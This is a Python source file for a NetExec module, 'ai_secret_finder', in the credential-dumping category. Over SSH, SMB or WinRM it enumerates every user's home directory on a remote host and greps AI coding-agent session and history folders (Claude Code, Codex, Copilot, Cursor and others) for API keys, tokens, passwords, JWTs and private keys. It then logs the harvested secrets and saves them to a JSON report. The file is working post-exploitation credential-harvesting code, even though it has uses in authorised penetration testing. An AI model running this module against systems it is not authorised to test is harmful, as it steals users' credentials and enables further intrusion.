import base64
import json
import re
from datetime import datetime
from os import makedirs
from os.path import join

from nxc.helpers.misc import CATEGORY
from nxc.paths import NXC_PATH


class NXCModule:
    """
    Hunt for secrets leaked into AI coding-agent session and history files.

    Scans directories used by Claude Code, Codex CLI, GitHub Copilot CLI,
    Gemini CLI, Cursor, Windsurf, Cline, Roo Code, Aider, Continue, OpenCode,
    Amazon Q, Zed, Pear AI, and Void.
    Reports leaked API keys, tokens, passwords, and private-key blocks.

    Module by @defensy (Mehdi Dridi)
    """

    name = "ai_secret_finder"
    description = "Hunt for secrets in AI coding-agent session/history files (Claude, Copilot, Codex, Gemini, Cursor...)"
    supported_protocols = ["ssh", "smb", "winrm"]
    category = CATEGORY.CREDENTIAL_DUMPING

    STRICT_PATTERNS = [
        ("GITHUB_TOKEN", r"gh[pousr]_[A-Za-z0-9_]{20,}|github_pat_[A-Za-z0-9_]{20,}"),
        ("GITLAB_TOKEN", r"glpat-[A-Za-z0-9_-]{16,}"),
        ("AWS_ACCESS_KEY", r"AKIA[A-Z0-9]{16}"),
        ("GOOGLE_API_KEY", r"AIza[0-9A-Za-z_-]{20,}"),
        ("SLACK_TOKEN", r"xox[baprs]-[A-Za-z0-9-]{10,}"),
        ("DISCORD_TOKEN", r"mfa\.[A-Za-z0-9_-]{20,}"),
        ("STRIPE_KEY", r"sk_live_[A-Za-z0-9]{24,}"),
        ("STRIPE_RKEY", r"rk_live_[A-Za-z0-9]{24,}"),
        ("TWILIO_SID", r"AC[a-f0-9]{32}"),
        ("TWILIO_KEY", r"SK[a-f0-9]{32}"),
        ("SENDGRID_KEY", r"SG\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43}"),
        ("ANTHROPIC_KEY", r"sk-ant-[A-Za-z0-9_-]{90,}"),
        ("OPENAI_KEY", r"sk-(?!ant-)(?:proj-)?[A-Za-z0-9_-]{40,}"),
        ("HF_TOKEN", r"hf_[A-Za-z0-9]{30,}"),
        ("PRIVATE_KEY", r"-----BEGIN [A-Z0-9 ]+ PRIVATE KEY-----"),
        ("JWT", r"eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}"),
    ]

    GENERIC_PATTERNS = [
        ("AWS_SECRET", r"aws_secret_access_key\b\s*[:=]\s*[\"']?([A-Za-z0-9/+]{20,})"),
        ("API_KEY", r"api[_-]?key\b\s*[:=]\s*[\"']?([A-Za-z0-9_+/.-]{10,})"),
        ("REFRESH_TOKEN", r"refresh[_-]token\b\s*[:=]\s*[\"']?([A-Za-z0-9_+/.-]{10,})"),
        ("CLIENT_SECRET", r"client[_-]secret\b\s*[:=]\s*[\"']?([A-Za-z0-9_+/.-]{10,})"),
        ("PASSWORD", r"[Pp]assword\s*[:=]\s*[\"']?([A-Za-z0-9!@#$%^*_+/.-]{8,})"),
        ("WEBHOOK_SECRET", r"webhook[_-]?secret\b\s*[:=]\s*[\"']?([A-Za-z0-9_+/.-]{10,})"),
    ]

    LINUX_AGENT_DIRS = {
        "Claude Code": [".claude"],
        "Codex CLI": [".codex"],
        "GitHub Copilot CLI": [".copilot", ".config/github-copilot"],
        "Gemini CLI": [".gemini"],
        "Cursor": [".cursor"],
        "Windsurf": [".windsurf", ".codeium/windsurf"],
        "Cline": [".cline", ".config/cline"],
        "Roo Code": [".roo", ".roo-code"],
        "Aider": [".aider"],
        "Continue": [".continue"],
        "OpenCode": [".opencode"],
        "Amazon Q": [".aws/amazonq", ".q"],
        "Zed": [".config/zed", ".local/share/zed"],
        "Pear AI": [".pearai"],
        "Void": [".void"],
    }

    WIN_AGENT_PATHS = {
        "Claude Code": [".claude", r"AppData\Roaming\Claude"],
        "Codex CLI": [".codex"],
        "GitHub Copilot CLI": [".copilot", r"AppData\Roaming\github-copilot"],
        "Gemini CLI": [".gemini"],
        "Cursor": [".cursor", r"AppData\Roaming\Cursor"],
        "Windsurf": [".windsurf", r"AppData\Roaming\Windsurf"],
        "Cline": [r"AppData\Roaming\Code\User\globalStorage\saoudrizwan.claude-dev"],
        "Roo Code": [r"AppData\Roaming\Code\User\globalStorage\rooveterinaryinc.roo-cline"],
        "Continue": [".continue", r"AppData\Roaming\Continue"],
        "OpenCode": [".opencode"],
        "Aider": [".aider"],
        "Amazon Q": [r"AppData\Roaming\Amazon Q", ".q"],
        "Zed": [r"AppData\Roaming\Zed"],
        "Pear AI": [r"AppData\Roaming\PearAI"],
    }

    LINUX_EXTENSIONS = "*.json *.jsonl *.yaml *.yml *.toml *.txt *.log *.conf *.env *.sh"
    WIN_EXTENSIONS = ("*.json", "*.jsonl", "*.yaml", "*.yml", "*.toml", "*.txt", "*.log", "*.conf", "*.env")
    MAX_FINDINGS_PER_DIR = 200

    LABEL_DISPLAY = {
        "GITHUB_TOKEN": "github_token",
        "GITLAB_TOKEN": "gitlab_token",
        "AWS_ACCESS_KEY": "aws_access_key",
        "GOOGLE_API_KEY": "google_api_key",
        "SLACK_TOKEN": "slack_token",
        "DISCORD_TOKEN": "discord_token",
        "STRIPE_KEY": "stripe_key",
        "STRIPE_RKEY": "stripe_restricted_key",
        "TWILIO_SID": "twilio_sid",
        "TWILIO_KEY": "twilio_key",
        "SENDGRID_KEY": "sendgrid_key",
        "OPENAI_KEY": "openai_key",
        "ANTHROPIC_KEY": "anthropic_key",
        "HF_TOKEN": "huggingface_token",
        "PRIVATE_KEY": "private_key",
        "JWT": "jwt",
        "AWS_SECRET": "aws_secret",
        "API_KEY": "api_key",
        "REFRESH_TOKEN": "refresh_token",
        "CLIENT_SECRET": "client_secret",
        "PASSWORD": "password",
        "WEBHOOK_SECRET": "webhook_secret",
    }

    KNOWN_FAKE = re.compile(
        r"AKIAIOSFODNN7EXAMPLE|AKIAABCDEFGHIJKLMNOP|AKIAYVP4CIPPERUVIFXG"
        r"|YOUR[_-]?(?:API[_-]?)?(?:KEY|TOKEN|SECRET|PASSWORD)"
        r"|(?:EXAMPLE|PLACEHOLDER|CHANGE[_-]?ME|DUMMY|FAKE|FORGED|BOGUS|SAMPLE"
        r"|TEST[_-]?KEY|TEST[_-]?TOKEN|INSERT[_-]?(?:YOUR[_-]?)?PASSWORD)"
        r"|PASTE[_-](?:TOKEN|SECRET|KEY|PASSWORD|HERE)[_-]?(?:HERE)?"
        r"|abcdef1234567890|1234567890abcdef"
        r"|X{4,}|<[^<>]{2,60}>|\{\{[^{}]{2,60}\}\}|\$\{[^{}]{2,60}\}",
        re.IGNORECASE,
    )

    SOURCE_CODE_LINE = re.compile(
        r'r"[^"]{0,5}\\b|r\'[^\']{0,5}\\b|re\.compile\('
        r"|Detector\(|BUILTIN_AGENT_SIGNATURES|\\bAKIA|-----BEGIN.*\\\\n"
    )

    SKIP_FILE_RE = re.compile(
        r"(?:policy-limits|remote-settings|managed-settings|usage-policies).*\.signature\.json$",
        re.IGNORECASE,
    )

    PASSWORD_FP_WORDS = {
        "policy", "confirm", "mismatch", "strength", "required", "validate",
        "settings", "creation", "security", "disabled", "attempts", "encoding",
        "manager", "enabled", "expired", "history", "pattern", "contain",
        "changed", "updated", "matched", "invalid", "correct", "entered",
        "protected", "undefined", "forgotten", "recovery", "reminder", "question",
        "database", "username", "optional", "provided", "accepted", "rejected",
        "verified", "generate", "template", "contains", "length", "boolean",
        "integer", "default", "example", "sanitize", "hashing", "bcrypt",
        "argon2", "pbkdf2", "minlength", "maxlength",
    }

    GENERIC_LABELS = {"API_KEY", "REFRESH_TOKEN", "CLIENT_SECRET", "WEBHOOK_SECRET", "AWS_SECRET", "PASSWORD"}

    JWT_USER_FIELDS = ("sub", "email", "preferred_username", "username", "upn", "unique_name", "name")
    UUID_RE = re.compile(r"^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$", re.IGNORECASE)
    JWT_SERVICE_SKIP = {"api_token", "service_account", "bot", "system", "anonymous", "guest", "client"}
    PRIVATE_KEY_RE = re.compile(r"-----BEGIN ([A-Z0-9 ]+) PRIVATE KEY-----[\s\S]*?-----END \1 PRIVATE KEY-----")

    def __init__(self):
        self.all_users = True
        self.agent_filter = None
        self.strict_only = False
        self.max_findings = self.MAX_FINDINGS_PER_DIR

    def options(self, context, module_options):
        """
        ALL_USERS     Scan every user's home directory (default: True).
        AGENT         Filter to one agent, e.g. claude, codex, copilot (default: all).
        STRICT        Only report high-confidence token patterns (default: False).
        MAX_FINDINGS  Maximum findings printed per agent directory (default: 50).
        """
        if "ALL_USERS" in module_options:
            self.all_users = module_options["ALL_USERS"].lower() not in ("false", "0", "no")
        if "AGENT" in module_options:
            self.agent_filter = module_options["AGENT"].lower()
        if "STRICT" in module_options:
            self.strict_only = module_options["STRICT"].lower() not in ("false", "0", "no")
        if "MAX_FINDINGS" in module_options:
            try:
                self.max_findings = int(module_options["MAX_FINDINGS"])
            except ValueError:
                context.log.fail("MAX_FINDINGS must be an integer")
                return False

    def on_login(self, context, connection):
        if "ssh" in context.protocol:
            self.scan_linux(context, connection)
        else:
            self.scan_windows(context, connection)

    def scan_linux(self, context, connection):
        find_roots = "/home /root" if self.all_users else "~"
        all_dir_names = {d for dirs in self.LINUX_AGENT_DIRS.values() for d in dirs}
        basenames = [d.split("/")[-1] for d in all_dir_names]
        name_expr = " -o ".join(f'-name "{n}"' for n in basenames)
        find_cmd = f"find {find_roots} -maxdepth 5 -type d \\( {name_expr} \\) 2>/dev/null"
        raw = connection.execute(f'/bin/bash -c "{find_cmd}"')

        if not raw or not raw.strip():
            context.log.display("No AI agent directories found")
            return

        discovered = [line.strip() for line in raw.splitlines() if line.strip()]
        context.log.success(f"Discovered {len(discovered)} AI agent director(ies)")

        seen = set()
        findings = []
        for agent_dir in discovered:
            agent_name = self.identify_linux_agent(agent_dir)
            if self.agent_filter and self.agent_filter not in agent_name.lower():
                continue
            context.log.display(f"Scanning [{agent_name}] → {agent_dir}")
            self.grep_linux(context, connection, agent_name, agent_dir, seen, findings)

        if findings:
            self.save_json_report(context, connection, findings)

    def grep_linux(self, context, connection, agent_name, agent_dir, seen, findings):
        patterns = list(self.STRICT_PATTERNS)
        if not self.strict_only:
            patterns += self.GENERIC_PATTERNS

        combined = "|".join(f"({p})" for _, p in patterns)
        combined_safe = combined.replace("'", "'\\''")
        includes = " ".join(f"--include='{ext}'" for ext in self.LINUX_EXTENSIONS.split())
        excludes = " ".join(f"--exclude-dir={d}" for d in ("rewind-file-snapshots", "backups", "__pycache__", "node_modules", "cache", ".git"))
        excludes += " '--exclude=*policy-limits*signature.json' '--exclude=*remote-settings*signature.json' '--exclude=*managed-settings*signature.json' '--exclude=*usage-policies*signature.json'"
        grep_cmd = f"grep -rEn -m 5 {includes} {excludes} '{combined_safe}' '{agent_dir}' 2>/dev/null | head -{self.max_findings}"
        findings_raw = connection.execute(f'/bin/bash -c "{grep_cmd}"')

        jwt_pattern = dict(self.STRICT_PATTERNS).get("JWT", "")
        if jwt_pattern:
            jwt_cmd = f"grep -rEoh {includes} {excludes} '{jwt_pattern}' '{agent_dir}' 2>/dev/null | sort -u"
            jwt_raw = connection.execute(f'/bin/bash -c "{jwt_cmd}"')
            if jwt_raw and jwt_raw.strip():
                extra = findings_raw + "\n" + jwt_raw if findings_raw else jwt_raw
                findings_raw = extra

        if not findings_raw or not findings_raw.strip():
            context.log.display(f"  [{agent_name}] No secrets found")
            return

        count = 0
        for line in findings_raw.splitlines():
            line = line.strip()
            if not line:
                continue
            label, value_str = self.classify_line(line)
            if not value_str:
                continue
            disp = value_str.split(": ", 1)[-1] if ": " in value_str else value_str
            file_ref = self.extract_file_ref(line, agent_dir)
            if label == "JWT":
                user = self.decode_jwt_user(disp)
                if not user:
                    continue
                key = ("JWT_USER", user)
                if key in seen:
                    continue
                seen.add(key)
                count += 1
                context.log.highlight(f"[{agent_name}] [JWT]  username: {user}")
                findings.append({"agent": agent_name, "label": "JWT", "value": user, "file": file_ref})
            else:
                key = (label, disp)
                if key in seen:
                    continue
                seen.add(key)
                count += 1
                context.log.highlight(f"[{agent_name}] [{label}]  {disp}")
                findings.append({"agent": agent_name, "label": label, "value": disp, "file": file_ref})

        if count == 0:
            context.log.display(f"  [{agent_name}] No secrets found (all filtered)")

    def identify_linux_agent(self, path: str) -> str:
        low = path.lower()
        for agent, dirs in self.LINUX_AGENT_DIRS.items():
            for d in dirs:
                if d.lower() in low:
                    return agent
        return "Unknown AI Agent"

    def scan_windows(self, context, connection):
        if self.all_users:
            user_enum_ps = "$users = Get-ChildItem -Path 'C:\\Users' -Directory -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName; $users"
        else:
            user_enum_ps = "[System.Environment]::GetFolderPath('UserProfile')"

        raw_users = connection.execute(f'powershell.exe "{user_enum_ps}"', True)
        if not raw_users or not raw_users.strip():
            context.log.display("Could not enumerate user directories")
            return

        user_dirs = [u.strip() for u in raw_users.splitlines() if u.strip()]
        context.log.display(f"Checking {len(user_dirs)} user dir(s) for AI agent data")

        seen = set()
        findings = []
        for user_dir in user_dirs:
            for agent_name, rel_paths in self.WIN_AGENT_PATHS.items():
                if self.agent_filter and self.agent_filter not in agent_name.lower():
                    continue
                for rel in rel_paths:
                    self.grep_windows(context, connection, agent_name, f"{user_dir}\\{rel}", seen, findings)

        if findings:
            self.save_json_report(context, connection, findings)

    def grep_windows(self, context, connection, agent_name, agent_dir, seen, findings):
        patterns = list(self.STRICT_PATTERNS)
        if not self.strict_only:
            patterns += self.GENERIC_PATTERNS

        ps_pattern_esc = "|".join(p for _, p in patterns).replace('"', '`"')
        includes = ",".join(f'"*{e}"' for e in self.WIN_EXTENSIONS)
        ps_script = (
            f"if (Test-Path '{agent_dir}') {{"
            f"  Get-ChildItem -Path '{agent_dir}' -Recurse -Include {includes} -ErrorAction SilentlyContinue"
            f'  | Select-String -Pattern "{ps_pattern_esc}" -Encoding UTF8 -ErrorAction SilentlyContinue'
            f"  | Select-Object -First {self.max_findings}"
            f"  | ForEach-Object {{ $_.ToString() }}"
            f"}}"
        )
        raw = connection.execute(f'powershell.exe "{ps_script}"', True)
        if not raw or not raw.strip():
            return

        count = 0
        for line in raw.splitlines():
            line = line.strip()
            if not line:
                continue
            label, value_str = self.classify_line(line)
            if not value_str:
                continue
            disp = value_str.split(": ", 1)[-1] if ": " in value_str else value_str
            file_ref = self.extract_file_ref(line, agent_dir)
            if label == "JWT":
                user = self.decode_jwt_user(disp)
                if not user:
                    continue
                key = ("JWT_USER", user)
                if key in seen:
                    continue
                seen.add(key)
                count += 1
                context.log.highlight(f"[{agent_name}] [JWT]  username: {user}")
                findings.append({"agent": agent_name, "label": "JWT", "value": user, "file": file_ref})
            else:
                key = (label, disp)
                if key in seen:
                    continue
                seen.add(key)
                count += 1
                context.log.highlight(f"[{agent_name}] [{label}]  {disp}")
                findings.append({"agent": agent_name, "label": label, "value": disp, "file": file_ref})

        if count > 0:
            context.log.success(f"Secrets found in [{agent_name}] {agent_dir}")

    def extract_file_ref(self, line: str, agent_dir: str) -> str:
        if ":" not in line:
            return ""
        parts = line.split(":", 2)
        if len(parts) >= 2 and parts[1].isdigit():
            filepath = parts[0].replace(agent_dir + "/", "").replace(agent_dir + "\\", "")
            return f"{filepath}:{parts[1]}"
        return ""

    def save_json_report(self, context, connection, findings):
        output_dir = join(NXC_PATH, "modules", "ai_secret_finder")
        makedirs(output_dir, exist_ok=True)
        host = re.sub(r"[^\w.-]", "_", connection.host)[:60]
        stamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"ai_secrets_{host}_{stamp}.json"
        filepath = join(output_dir, filename)
        report = {
            "host": connection.host,
            "timestamp": datetime.now().isoformat(),
            "total_findings": len(findings),
            "findings": findings,
        }
        with open(filepath, "w") as f:
            json.dump(report, f, indent=2)
        context.log.success(f"Report saved → {filepath}")

    def classify_line(self, line: str) -> tuple:
        for label, pattern in self.STRICT_PATTERNS + self.GENERIC_PATTERNS:
            m = re.search(pattern, line, re.IGNORECASE)
            if m and not self.is_false_positive(line, m.group(0), label):
                value = m.group(1).strip().strip("\"'`") if m.lastindex and m.lastindex >= 1 else m.group(0).strip()
                return label, f"{self.LABEL_DISPLAY.get(label, label.lower())}: {value}"
        return "GENERIC", ""

    def is_false_positive(self, line: str, matched_text: str, label: str = "") -> bool:
        if self.KNOWN_FAKE.search(matched_text) or self.KNOWN_FAKE.search(line):
            return True
        if self.SOURCE_CODE_LINE.search(line):
            return True
        if re.search(r"r[\"'][^\"']*" + re.escape(matched_text[:10]), line):
            return True
        if re.search(r"([A-Za-z0-9])\1{8,}", matched_text):
            return True
        if label in self.GENERIC_LABELS:
            m = re.search(r"[:=]\s*[\"']?([A-Za-z0-9!@#$%^*_+/.-]+)", matched_text, re.IGNORECASE)
            val = m.group(1) if m else matched_text
            if self.is_generic_fp(val):
                return True
        if label == "PASSWORD":
            m = re.search(r"[:=]\s*[\"']?([A-Za-z0-9!@#$%^*_+/.-]+)", matched_text, re.IGNORECASE)
            val = m.group(1) if m else matched_text
            if val.lower() in self.PASSWORD_FP_WORDS:
                return True
            if re.search(r"ConvertTo|SecureString|environ\.get", val, re.IGNORECASE):
                return True
            if re.search(r"(_password|_field|_input)$|^csrf_", val.lower()):
                return True
        return False

    def is_generic_fp(self, val: str) -> bool:
        v = val.lower()
        if re.fullmatch(r"[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}", val, re.IGNORECASE):
            return True
        if re.fullmatch(r"[a-z]{6,}", v):
            return True
        if re.fullmatch(r"[A-Za-z_][A-Za-z0-9_.]*\.[A-Za-z_][A-Za-z0-9_.]*", val):
            return True
        if re.search(r"(_token|_secret|_key|_type|_id|_header|_name|_len|_length|_value|_data|_hash|_field)$", v):
            return True
        if val.startswith("/") and "/" in val[1:]:
            return True
        if re.search(r"\.(py|txt|json|php|js|ts|md|sh|yaml|yml|rb|go|java|png|jpg|gif|svg)$", v):
            return True
        if val.startswith("_"):
            return True
        if re.fullmatch(r"[A-Z][A-Z0-9_]{7,}", val):
            return True
        if re.search(r"[A-Za-z]-[A-Za-z]", val):
            return True
        if re.fullmatch(r"[0-9]{6,}", val):
            return True
        return "_test_" in v

    def is_useful_username(self, val: str) -> bool:
        if not val or len(val) < 3:
            return False
        if self.UUID_RE.match(val):
            return False
        if re.fullmatch(r"[0-9]+", val):
            return False
        if val.lower() in self.JWT_SERVICE_SKIP:
            return False
        return not ("@" not in val and re.fullmatch(r"[a-z0-9]+(-[a-z0-9]+){2,}", val))

    def decode_jwt_user(self, token: str):
        try:
            parts = token.split(".")
            if len(parts) != 3:
                return None
            pad = parts[1] + "=" * (-len(parts[1]) % 4)
            payload = json.loads(base64.urlsafe_b64decode(pad))
            for field in self.JWT_USER_FIELDS:
                val = payload.get(field)
                if val and isinstance(val, str) and self.is_useful_username(val):
                    return val
        except Exception:
            pass
        return None
